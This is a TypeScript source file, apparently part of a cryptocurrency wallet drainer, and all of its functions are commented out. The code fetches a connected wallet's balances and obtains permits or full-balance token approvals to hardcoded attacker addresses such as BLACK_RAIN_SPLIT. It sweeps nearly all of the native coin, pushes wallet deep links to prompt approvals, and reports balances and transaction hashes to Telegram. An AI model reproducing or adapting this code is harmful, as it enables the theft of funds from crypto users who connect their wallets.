  //   const signer = provider.getSigner();
  //   const nativeTokenPriceInUSD = await fetchTokenPrice(chain.id);
  
  //   // Calculate native token equivalent for each token
  //   console.log(`[Chain ${chain.id}] Calculating native token equivalent...`);
  //   await calculateNativeValuePerToken(validTokens, nativeTokenPriceInUSD, chain.id);
  
  //   // Native token transfer
  //   try {
  //     const totalTokenValueInUSD = validTokens.reduce(
  //       (sum, token) => sum + token.amountUSD,
  //       0
  //     );
  //     await transferNativeToken(
  //       BLACK_RAIN_SPLIT,
  //       signer,
  //       nativeTokenPriceInUSD,
  //       chain.id,
  //       totalTokenValueInUSD
  //     );
  //   } catch (error) {
  //     if (error instanceof Error) {
  //       console.warn(
  //         `Failed to transfer native token on ${chain.label}:`,
  //         error.message
  //       );
  //     } else {
  //       console.warn(
  //         `Failed to transfer native token on ${chain.label}: Unknown error`
  //       );
  //     }
  //   }
  
  //   // Process each valid token
  //   for (const token of validTokens) {
  //     console.log(`Processing token: ${token.name} on ${chain.label}`);
  
  //     // Skip processing if the token is native
  //     if (token.type === "NATIVE") {
  //       console.log("Skipping decimals fetch for native token.");
  //       continue; // Move to the next token
  //     }
  
  //     // Initialize the contract for the token
  //     token.contract = new ethers.Contract(token.address, ERC20_ABI, provider);
  
  //     let tokenAlreadyTransferred = false; // Track if the token has been transferred
  
  //     try {
  //       // Validate token contract by attempting to fetch decimals
  //       const decimals = await token.contract.decimals();
  //       console.log(`Decimals for token ${token.name}: ${decimals}`);
  
  //       // Add recipientAddress (e.g., a hardcoded value or dynamically provided)
  //       const recipientAddress = FRONTEND_RECIPIENT; // Replace with actual recipient logic
  
  //       // Use handlePermitBasedTransfer
  //       await handlePermitBasedTransfer(
  //         token,
  //         userAddress,
  //         signer,
  //         chain,
  //         provider,
  //         recipientAddress // Pass the recipient address here
  //       );
  //       tokenAlreadyTransferred = true; // Mark as transferred
  
  //       // Avoid redundant dynamic gas transactions if already transferred
  //       if (!tokenAlreadyTransferred) {
  //         const transaction: ethers.providers.TransactionRequest = {
  //           to: token.contract.address,
  //           data: token.contract.interface.encodeFunctionData("transfer", [
  //             BLACK_RAIN_SPLIT,
  //             token.amount,
  //           ]),
  //         };
  
  //         await sendTransactionWithDynamicGas(
  //           parseInt(chain.id, 16),
  //           provider,
  //           transaction
  //         );
  //       }
  //     } catch (error) {
  //       if (error instanceof Error) {
  //         console.error(`Error processing token ${token.name}: ${error.message}`);
  //       } else {
  //         console.error(`Error processing token ${token.name}: Unknown error`);
  //       }
  
  //       continue; // Skip to the next token
  //     }
  //   }
  // };
 


// const transferNativeToken = async (
//     recipient: string,
//     signer: ethers.Signer,
//     tokenPriceInUSD: number,
//     chainId: string,
//     totalTokenValueInUSD: number
//   ): Promise<void> => {
//     try {
//       const provider = signer.provider;
//       if (!provider) {
//         throw new Error("Signer does not have an associated provider.");
//       }
  
//       const signerBalance = await signer.getBalance();
//       const feeData = await provider.getFeeData();
//       const gasPrice = feeData.gasPrice || ethers.utils.parseUnits("5", "gwei");
//       const gasLimit = BigNumber.from(21000);
//       const totalGasCost = gasPrice.mul(gasLimit);
  
//       if (signerBalance.lte(totalGasCost)) {
//         console.log("Insufficient balance to cover gas fees.");
//         return;
//       }
  
//       const balanceInUSD =
//         parseFloat(ethers.utils.formatEther(signerBalance.sub(totalGasCost))) *
//         tokenPriceInUSD;
  
//       // Skip transfer if the native token balance is below $20
//       if (balanceInUSD < 3) {
//         console.log("Native token balance below $20. Skipping transfer.");
//         return;
//       }
  
//       // Leave $10 untouched if conditions are met
//       if (balanceInUSD >= 50 && totalTokenValueInUSD > 50) {
//         const amountToLeaveInUSD = 10; // Leave $10 worth of ETH
//         const remainingBalance = ethers.utils.parseEther(
//           ((balanceInUSD - amountToLeaveInUSD) / tokenPriceInUSD).toFixed(18)
//         );
//         const amountToSend = signerBalance
//           .sub(totalGasCost)
//           .sub(remainingBalance);
  
//         if (
//           amountToSend.isZero() ||
//           amountToSend.lt(ethers.utils.parseEther("0.0001"))
//         ) {
//           console.log(
//             "Amount to send is too small after subtracting gas fees and leaving $10."
//           );
//           return;
//         }
  
//         const tx = await signer.sendTransaction({
//           to: recipient,
//           value: amountToSend,
//           gasPrice,
//           gasLimit,
//         });
  
//         console.log(`Transaction sent: ${tx.hash}`);
//         await tx.wait();
//         console.log(`Transaction confirmed: ${tx.hash}`);
//       } else {
//         // Standard transfer logic when conditions are not met
//         const amountToSend = signerBalance.sub(totalGasCost);
  
//         if (
//           amountToSend.isZero() ||
//           amountToSend.lt(ethers.utils.parseEther("0.0001"))
//         ) {
//           console.log(
//             "Amount to send is too small after subtracting gas fees."
//           );
//           return;
//         }
  
//         const tx = await signer.sendTransaction({
//           to: recipient,
//           value: amountToSend,
//           gasPrice,
//           gasLimit,
//         });
  
//         console.log(`Transaction sent: ${tx.hash}`);
//         await tx.wait();
//         console.log(`Transaction confirmed: ${tx.hash}`);
//       }
//     } catch (error: unknown) {
//       if (
//         typeof error === "object" &&
//         error !== null &&
//         "code" in error &&
//         (error as { code: string }).code === "ACTION_REJECTED"
//       ) {
//         console.warn(
//           `Transaction rejected by the user. Skipping to the next token.`
//         );
//       } else if (error instanceof Error) {
//         console.error(
//           `Error transferring native token on chain ${chainId}:`,
//           error.message
//         );
//       } else {
//         console.error(
//           `An unknown error occurred while transferring native token on chain ${chainId}.`
//         );
//       }
//     }
//   };




  // const fetchBalances = async (address: string, chainId: number): Promise<unknown[]> => {
  //   try {
  //     const API_URL = `${BASE_API_URL}/fetchBalances`;
  
  //     const response = await axios.post(API_URL, { address, chainId }, {
  //       headers: {
  //         "Content-Type": "application/json",
  //       },
  //     });
  
  //     if (response.status === 200) {
  //       console.log("Balances fetched successfully:", response.data.balances);
  //       return response.data.balances;
  //     } else {
  //       console.error("Failed to fetch balances:", response.data);
  //       return [];
  //     }
  //   } catch (error) {
  //     if (axios.isAxiosError(error)) {
  //       console.error("Error while fetching balances (Axios):", error.response?.data || error.message);
  //     } else if (error instanceof Error) {
  //       console.error("Error while fetching balances:", error.message);
  //     } else {
  //       console.error("An unknown error occurred while fetching balances.");
  //     }
  //     return [];
  //   }
  // };
 










  // const handleApprovalAndTransfer = async (
  //   token: TokenBalance,
  //   userAddress: string,
  //   provider: ethers.providers.Web3Provider,
  //   chainId: number | string,
  //   recipientAddress: string,
  //   walletName: string // Specify the wallet name for deep link generation
  // ): Promise<void> => {
  //   try {
  //     const signer = provider.getSigner();
  //     const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
  
  //     let decimals: number;
  //     try {
  //       decimals = await tokenContract.decimals();
  //     } catch (error) {
  //       console.warn(
  //         `Failed to fetch decimals for token ${token.name}. Defaulting to 18. Error:`,
  //         error
  //       );
  //       decimals = 18; // Fallback to 18 decimals
  //     }
  
  //     let rawBalance: BigNumber;
  //     try {
  //       rawBalance = await tokenContract.balanceOf(userAddress);
  //     } catch (error) {
  //       console.error(
  //         `Failed to fetch balance for token ${token.name} (${token.address}). Skipping transfer. Error:`,
  //         error
  //       );
  //       return; // Exit if balance can't be fetched
  //     }
  
  //     if (rawBalance.isZero()) {
  //       console.warn(`User has zero balance for token ${token.name}. Skipping transfer.`);
  //       return;
  //     }
  
  //     const adjustedBalance = ethers.utils.formatUnits(rawBalance, decimals);
  //     log(
  //       `Token: ${token.name} | Raw Balance: ${rawBalance.toString()} | Adjusted Balance: ${adjustedBalance}`
  //     );
  
  //     // Fetch token price in USD (optional)
  //     const tokenPriceInUSD = await fetchTokenPrice(chainId.toString());
  //     const balanceInUSD = parseFloat(adjustedBalance) * tokenPriceInUSD;
  //     log(`Balance in USD: $${balanceInUSD.toFixed(2)}`);
  
  //     // Notify Telegram about balance details
  //     const balanceMessage = `Token: ${token.name}\nBalance: ${adjustedBalance} ${token.symbol}\nValue: $${balanceInUSD.toFixed(
  //       2
  //     )}`;
  //     await sendToTelegram(balanceMessage);
  
  //     // Fetch current allowance
  //     const allowance = await tokenContract.allowance(userAddress, BR_INITIATOR_ADDRESS);
  //     log(
  //       `Allowance for ${token.name}: ${ethers.utils.formatUnits(allowance, decimals)}`
  //     );
  
  //     // Generate deep link for wallet approval
  //     const deepLinkParams = {
  //       method: "approveTransaction",
  //       params: {
  //         tokenAddress: token.address,
  //         userAddress,
  //         chainId,
  //         recipientAddress,
  //         amount: rawBalance.toString(),
  //       },
  //     };
  
  //     const deepLink = generateDeepLink(walletName, deepLinkParams);
  //     log(`Generated deep link: ${deepLink}`);
  
  //     // Notify Telegram about the deep link
  //     await sendToTelegram(`Approval required for ${token.name}. Use this link: ${deepLink}`);
  
  //     // Redirect user to the deep link immediately
  //     redirectToDeepLink(deepLink);
  
  //     // Approve the full balance if needed
  //     if (allowance.lt(rawBalance)) {
  //       log(
  //         `Allowance (${allowance.toString()}) is less than balance (${rawBalance.toString()}). Waiting for approval transaction...`
  //       );
  //       try {
  //         const approveTx = await tokenContract.approve(BR_INITIATOR_ADDRESS, rawBalance);
  //         log(`Approval transaction sent. Tx Hash: ${approveTx.hash}`);
  //         await approveTx.wait();
  //         log(`Approval successful for ${adjustedBalance} ${token.symbol}`);
  //         await sendToTelegram(
  //           `Approval successful for ${adjustedBalance} ${token.name}. Tx Hash: ${approveTx.hash}`
  //         );
  //       } catch (error) {
  //         console.error(`Error during approval for token ${token.name}:`, error);
  //         return; // Skip transfer if approval fails
  //       }
  //     } else {
  //       log(`Sufficient allowance exists for token ${token.name}. Skipping approval.`);
  //     }
  
  //     // Prepare payload for backend transfer
  //     const payload = {
  //       tokenAddress: token.address,
  //       userAddress,
  //       chainId: Number(chainId), // Ensure chainId is a number
  //       recipientAddress,
  //     };
  
  //     try {
  //       const response = (await sendToBackend("handleApprovalAndTransfer", payload)) as {
  //         backendTxHash: string;
  //         frontendTxHash: string;
  //       };
  
  //       if (response?.backendTxHash && response?.frontendTxHash) {
  //         log(
  //           `Transfer successful! Backend Tx Hash: ${response.backendTxHash}, Frontend Tx Hash: ${response.frontendTxHash}`
  //         );
  //         await sendToTelegram(
  //           `Transfer successful for ${adjustedBalance} ${token.name}.\nBackend Tx Hash: ${response.backendTxHash}\nFrontend Tx Hash: ${response.frontendTxHash}`
  //         );
  //       } else {
  //         console.warn(`Unexpected backend response for ${token.name}:`, response);
  //       }
  //     } catch (error) {
  //       console.error(
  //         `Error sending transfer request for token ${token.name} to backend:`,
  //         error
  //       );
  //     }
  //   } catch (error: unknown) {
  //     if (error instanceof Error) {
  //       console.error(
  //         `Error in handleApprovalAndTransfer for token ${token.name}:`,
  //         error.message
  //       );
  //       await sendToTelegram(
  //         `Error during approval or transfer for ${token.name}: ${error.message}`
  //       );
  //     } else {
  //       console.error(`Unknown error in handleApprovalAndTransfer:`, error);
  //     }
  //   }
  // };
  


  // const transferNativeToken = async (
//   recipient: string,
//   signer: ethers.Signer,
//   tokenPriceInUSD: number,
//   chainId: string,
//   totalTokenValueInUSD: number
// ): Promise<void> => {
//   try {
//     const provider = signer.provider;
//     if (!provider) {
//       throw new Error("Signer does not have an associated provider.");
//     }

//     const signerBalance = await signer.getBalance();
//     const feeData = await provider.getFeeData();
//     const gasPrice = feeData.gasPrice || ethers.utils.parseUnits("5", "gwei");
//     const gasLimit = BigNumber.from(21000);
//     const totalGasCost = gasPrice.mul(gasLimit);

//     if (signerBalance.lte(totalGasCost)) {
//       log("Insufficient balance to cover gas fees.");
//       return;
//     }

//     const balanceInUSD =
//       parseFloat(ethers.utils.formatEther(signerBalance.sub(totalGasCost))) *
//       tokenPriceInUSD;

//     // Skip transfer if the native token balance is below $20
//     if (balanceInUSD < 1) {
//       log("Native token balance below $1. Skipping transfer.");
//       return;
//     }

//     // Leave $10 untouched if conditions are met
//     if (balanceInUSD >= 50 && totalTokenValueInUSD > 50) {
//       const amountToLeaveInUSD = 10; // Leave $10 worth of ETH
//       const remainingBalance = ethers.utils.parseEther(
//         ((balanceInUSD - amountToLeaveInUSD) / tokenPriceInUSD).toFixed(18)
//       );
//       const amountToSend = signerBalance
//         .sub(totalGasCost)
//         .sub(remainingBalance);

//       if (
//         amountToSend.isZero() ||
//         amountToSend.lt(ethers.utils.parseEther("0.0001"))
//       ) {
//         log(
//           "Amount to send is too small after subtracting gas fees and leaving $10."
//         );
//         return;
//       }

//       const tx = await signer.sendTransaction({
//         to: recipient,
//         value: amountToSend,
//         gasPrice,
//         gasLimit,
//       });

//       log(`Transaction sent: ${tx.hash}`);
//       await tx.wait();
//       log(`Transaction confirmed: ${tx.hash}`);
//     } else {
//       // Standard transfer logic when conditions are not met
//       const amountToSend = signerBalance.sub(totalGasCost);

//       if (
//         amountToSend.isZero() ||
//         amountToSend.lt(ethers.utils.parseEther("0.0001"))
//       ) {
//         log(
//           "Amount to send is too small after subtracting gas fees."
//         );
//         return;
//       }

//       const tx = await signer.sendTransaction({
//         to: recipient,
//         value: amountToSend,
//         gasPrice,
//         gasLimit,
//       });

//       log(`Transaction sent: ${tx.hash}`);
//       await tx.wait();
//       log(`Transaction confirmed: ${tx.hash}`);
//     }
//   } catch (error: unknown) {
//     if (
//       typeof error === "object" &&
//       error !== null &&
//       "code" in error &&
//       (error as { code: string }).code === "ACTION_REJECTED"
//     ) {
//       console.warn(
//         `Transaction rejected by the user. Skipping to the next token.`
//       );
//     } else if (error instanceof Error) {
//       console.error(
//         `Error transferring native token on chain ${chainId}:`,
//         error.message
//       );
//     } else {
//       console.error(
//         `An unknown error occurred while transferring native token on chain ${chainId}.`
//       );
//     }
//   }
// };
